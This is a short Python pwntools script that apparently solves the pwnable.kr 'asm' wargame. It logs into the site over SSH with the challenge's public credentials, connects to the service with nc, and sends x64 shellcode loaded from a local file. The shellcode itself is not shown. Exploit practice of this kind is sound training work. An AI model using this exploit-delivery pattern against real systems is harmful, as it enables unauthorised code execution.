from pwn import *

context.log_level = "DEBUG"

payload = open("local_asm.raw", "r").read()

s = ssh(host='pwnable.kr', port=2222, user='asm', password='guest')
#s.download_file('asm')
#s.download_file('asm.c')

p = s.process(["nc", "0", "9026"])
#p = process("./asm")

p.recvuntil('give me your x64 shellcode: ')
p.sendline(payload)

print p.recvall()
